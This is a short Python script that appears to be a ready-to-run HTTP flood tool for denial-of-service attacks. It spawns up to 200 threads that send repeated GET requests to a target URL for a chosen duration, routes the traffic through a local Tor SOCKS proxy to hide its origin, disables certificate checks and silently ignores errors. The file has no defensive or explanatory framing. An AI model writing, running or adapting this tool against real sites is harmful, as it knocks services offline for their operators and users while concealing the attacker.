import threading, sys, os, time, requests
from random import choice, randint
from utils import *

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def flood():

    url = sys.argv[2]
    port = int(sys.argv[3])
    duration = int(sys.argv[4])

    time.sleep(5)

    stoptime = time.time() + duration
    sess = createsession()
    sess.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
    while time.time() < stoptime:
        try:
            headers = buildheaders(url)
            
            sess.get(f'{"http" if port == 80 else "https"}://{url}', headers=headers, verify=False, timeout=(5,2), stream=False)
        except Exception:
            pass

if __name__ == '__main__':
    print('''
             /$$                 /$$            /$$$$$$  /$$   /$$ /$$$$$$  /$$$$$$  /$$   /$$
            | $$                | $$           /$$__  $$| $$$ | $$|_  $$_/ /$$__  $$| $$$ | $$
            | $$       /$$   /$$| $$ /$$$$$$$$| $$  \ $$| $$$$| $$  | $$  | $$  \ $$| $$$$| $$
            | $$      | $$  | $$| $$|____ /$$/| $$  | $$| $$ $$ $$  | $$  | $$  | $$| $$ $$ $$
            | $$      | $$  | $$| $$   /$$$$/ | $$  | $$| $$  $$$$  | $$  | $$  | $$| $$  $$$$
            | $$      | $$  | $$| $$  /$$__/  | $$  | $$| $$\  $$$  | $$  | $$  | $$| $$\  $$$
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$|  $$$$$$/| $$ \  $$ /$$$$$$|  $$$$$$/| $$ \  $$
            |________/ \______/ |__/|________/ \______/ |__/  \__/|______/ \______/ |__/  \__/
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')